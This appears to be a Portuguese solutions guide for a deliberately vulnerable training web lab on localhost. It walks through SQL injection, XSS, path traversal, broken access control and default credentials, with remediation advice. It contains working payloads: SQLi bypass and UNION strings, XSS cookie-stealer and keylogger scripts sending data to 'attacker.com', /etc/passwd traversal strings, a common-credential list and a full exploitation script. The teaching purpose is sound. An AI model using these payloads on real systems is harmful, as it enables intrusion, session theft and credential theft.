# 🔓 Lab 1 - Soluções Detalhadas (Nível Fácil)

## 📋 Visão Geral

Este documento contém soluções passo a passo para todas as vulnerabilidades do Lab 1.

**Target**: http://localhost:5000

---

## 🎯 Vulnerabilidade 1: SQL Injection Básica

### Descrição

O formulário de login está vulnerável a SQL Injection básica porque concatena entrada do usuário diretamente na query SQL.

### Código Vulnerável

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### Exploração Passo a Passo

#### Método 1: Bypass com OR

1. **Acesse**: http://localhost:5000/
2. **No formulário de login, insira**:
   ```
   Username: admin' OR '1'='1'--
   Password: (qualquer coisa)
   ```

3. **Clique em Login**

4. **Resultado**: Login bem-sucedido como admin!

#### Por que funciona?

A query resultante é:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'qualquer'
```

- `admin' OR '1'='1'` - Fecha a string e adiciona condição sempre verdadeira
- `--` - Comenta o resto da query
- A senha é ignorada!

#### Método 2: Bypass com Comentário

```
Username: admin'--
Password: (ignorado)
```

Query resultante:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

O `--` comenta a verificação de senha!

#### Método 3: UNION para Extrair Dados

```
Username: ' UNION SELECT 1,username,password,'','admin' FROM users--
Password: (ignorado)
```

Extrai todos os usuários e senhas do banco!

### Teste Automatizado

```bash
# Usando curl
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1'--" \
  -d "password=test"

# Usando Python
import requests

data = {
    'username': "admin' OR '1'='1'--",
    'password': "anything"
}

response = requests.post('http://localhost:5000/login', data=data)
print(response.text)
```

### Remedição

```python
# CORRETO: Use prepared statements
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",
               (username, password))
```

---

## 🎯 Vulnerabilidade 2: XSS Reflected

### Descrição

O campo de busca reflete a entrada do usuário diretamente na página sem sanitização.

### Exploração Passo a Passo

1. **Acesse**: http://localhost:5000/

2. **No campo "Busca de Usuários", insira**:
   ```html
   <script>alert('XSS')</script>
   ```

3. **Clique em Buscar**

4. **Resultado**: Um alert box aparece com "XSS"!

#### Payloads Alternativos

```html
<!-- IMG tag -->
<img src=x onerror=alert('XSS')>

<!-- SVG -->
<svg/onload=alert('XSS')>

<!-- Body tag -->
<body onload=alert('XSS')>

<!-- Input -->
<input autofocus onfocus=alert('XSS')>
```

### Exploração Avançada

**Roubar Cookies**:
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

**Keylogger**:
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### Teste Automatizado

```python
import requests

# Teste simples
payload = "<script>alert('XSS')</script>"
response = requests.get('http://localhost:5000/search', params={'q': payload})

if payload in response.text:
    print("[!] XSS Reflected VULNERÁVEL!")
```

### Remedição

```python
# CORRETO: Escape HTML
from html import escape

query = escape(request.args.get('q', ''))
return f"<p>Você buscou por: {query}</p>"
```

---

## 🎯 Vulnerabilidade 3: XSS Stored

### Descrição

Os comentários são armazenados e exibidos sem sanitização.

### Exploração

1. **Acesse**: http://localhost:5000/
2. **No campo "Comentários", insira**:
   ```html
   <img src=x onerror=alert('Stored XSS')>
   ```
3. **Envie o comentário**
4. **Resultado**: O XSS é executado e permanece armazenado!

### Impacto

- ⚠️ Afeta TODOS os usuários que visitarem a página
- ⚠️ Mais perigoso que Reflected XSS
- ⚠️ Pode roubar sessões de admins

---

## 🎯 Vulnerabilidade 4: Information Disclosure

### Descrição

A página `/debug` expõe informações sensíveis.

### Exploração

1. **Acesse**: http://localhost:5000/debug

2. **Informações expostas**:
   - Secret key da aplicação
   - Variáveis de ambiente
   - Credenciais padrão
   - Path do banco de dados
   - FLAGS!

### Teste Automatizado

```python
response = requests.get('http://localhost:5000/debug')

if 'Secret Key' in response.text:
    print("[!] Information Disclosure detectado!")

if 'FLAG{' in response.text:
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    print(f"[+] FLAGS encontradas: {flags}")
```

---

## 🎯 Vulnerabilidade 5: Broken Access Control

### Descrição

O painel admin (`/admin`) não requer autenticação.

### Exploração

1. **Acesse diretamente**: http://localhost:5000/admin

2. **Sem login**: Você vê:
   - Todos os usuários
   - Todos os segredos
   - FLAG!

### Teste Automatizado

```python
# Tenta acessar admin sem autenticação
response = requests.get('http://localhost:5000/admin')

if response.status_code == 200 and 'Admin Panel' in response.text:
    print("[!] Broken Access Control - /admin acessível sem auth!")
```

### Remedição

```python
@app.route('/admin')
def admin():
    # CORRETO: Verifica autorização
    if 'role' not in session or session['role'] != 'admin':
        return "Acesso negado", 403

    # Lógica admin...
```

---

## 🎯 Vulnerabilidade 6: Directory Listing

### Descrição

A rota `/files` lista arquivos do servidor.

### Exploração

1. **Acesse**: http://localhost:5000/files

2. **Você vê**:
   - app.py (código fonte!)
   - vulnerable_easy.db (banco de dados!)
   - Outros arquivos

---

## 🎯 Vulnerabilidade 7: Path Traversal

### Descrição

A rota `/file` permite ler arquivos arbitrários do servidor.

### Exploração

1. **Ler código fonte**:
   ```
   http://localhost:5000/file?name=app.py
   ```

2. **Tentar ler /etc/passwd** (Linux):
   ```
   http://localhost:5000/file?name=../../../etc/passwd
   ```

3. **Ler win.ini** (Windows):
   ```
   http://localhost:5000/file?name=..\..\..\..\Windows\win.ini
   ```

### Payloads

```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

### Teste Automatizado

```python
# Tenta ler app.py
response = requests.get('http://localhost:5000/file', params={'name': 'app.py'})

if 'Flask' in response.text:
    print("[!] Path Traversal - conseguiu ler app.py!")

# Tenta path traversal
response = requests.get('http://localhost:5000/file',
                       params={'name': '../../../etc/passwd'})

if 'root:' in response.text:
    print("[!] Path Traversal crítico - leu /etc/passwd!")
```

---

## 🎯 Vulnerabilidade 8: Credenciais Padrão

### Descrição

A aplicação usa credenciais padrão facilmente adivinháveis.

### Exploração

Tente:
```
admin:admin
user:password
guest:guest
```

### Lista de Credenciais Comuns

```
admin:admin
admin:password
admin:12345
administrator:administrator
root:root
root:toor
test:test
demo:demo
```

---

## 🚀 Exploração Completa com Script

```python
#!/usr/bin/env python3
"""
Script de exploração completa do Lab 1
"""

import requests
import re

BASE_URL = 'http://localhost:5000'

def exploit_sql_injection():
    """Explora SQL Injection"""
    print("\n[*] Testando SQL Injection...")

    payload = {
        'username': "admin' OR '1'='1'--",
        'password': "test"
    }

    response = requests.post(f'{BASE_URL}/login', data=payload)

    if 'Login Successful' in response.text:
        print("[+] SQL Injection: SUCESSO!")
        print(f"    Payload: {payload['username']}")
    else:
        print("[-] SQL Injection: Falhou")

def exploit_xss():
    """Explora XSS Reflected"""
    print("\n[*] Testando XSS Reflected...")

    payload = "<script>alert('XSS')</script>"
    response = requests.get(f'{BASE_URL}/search', params={'q': payload})

    if payload in response.text:
        print("[+] XSS Reflected: VULNERÁVEL!")
        print(f"    Payload: {payload}")
    else:
        print("[-] XSS: Não vulnerável")

def exploit_info_disclosure():
    """Explora Information Disclosure"""
    print("\n[*] Testando Information Disclosure...")

    response = requests.get(f'{BASE_URL}/debug')

    if 'Secret Key' in response.text:
        print("[+] Information Disclosure: VULNERÁVEL!")

        # Extrai flags
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"    FLAGS encontradas: {flags}")

def exploit_broken_access():
    """Explora Broken Access Control"""
    print("\n[*] Testando Broken Access Control...")

    response = requests.get(f'{BASE_URL}/admin')

    if response.status_code == 200 and 'Admin Panel' in response.text:
        print("[+] Broken Access Control: VULNERÁVEL!")
        print("    /admin acessível sem autenticação!")

        # Extrai flags
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"    FLAGS: {flags}")

def exploit_path_traversal():
    """Explora Path Traversal"""
    print("\n[*] Testando Path Traversal...")

    # Tenta ler app.py
    response = requests.get(f'{BASE_URL}/file', params={'name': 'app.py'})

    if 'Flask' in response.text:
        print("[+] Path Traversal: VULNERÁVEL!")
        print("    Conseguiu ler app.py!")

def main():
    print("=" * 80)
    print("SCRIPT DE EXPLORAÇÃO - LAB 1 (FÁCIL)")
    print("=" * 80)

    try:
        requests.get(BASE_URL, timeout=2)
    except:
        print(f"\n[!] Erro: Servidor não está rodando em {BASE_URL}")
        print("    Execute: cd tests/vulnerable_apps/easy && python3 app.py")
        return

    exploit_sql_injection()
    exploit_xss()
    exploit_info_disclosure()
    exploit_broken_access()
    exploit_path_traversal()

    print("\n" + "=" * 80)
    print("EXPLORAÇÃO COMPLETA!")
    print("=" * 80)

if __name__ == '__main__':
    main()
```

---

## 📊 Resumo de Vulnerabilidades

| # | Vulnerabilidade | Severidade | URL | Exploração |
|---|----------------|------------|-----|-----------|
| 1 | SQL Injection | CRITICAL | `/login` | `admin' OR '1'='1'--` |
| 2 | XSS Reflected | HIGH | `/search` | `<script>alert(1)</script>` |
| 3 | XSS Stored | HIGH | `/comment` | `<img src=x onerror=alert(1)>` |
| 4 | Info Disclosure | MEDIUM | `/debug` | Acesso direto |
| 5 | Broken Access | HIGH | `/admin` | Acesso direto |
| 6 | Directory Listing | LOW | `/files` | Acesso direto |
| 7 | Path Traversal | HIGH | `/file` | `?name=../../../../etc/passwd` |
| 8 | Default Creds | MEDIUM | `/login` | `admin:admin` |

---

## 🎓 Lições Aprendidas

1. **Nunca confie em input do usuário**
2. **Sempre use prepared statements para SQL**
3. **Sempre escape/sanitize output HTML**
4. **Implemente controle de acesso apropriado**
5. **Não exponha informações sensíveis**
6. **Valide e sanitize paths de arquivos**
7. **Nunca use credenciais padrão**

---

**Próximo Lab**: [lab2-solutions.md](lab2-solutions.md) - Nível Médio

**Voltar**: [README.md](../README.md)
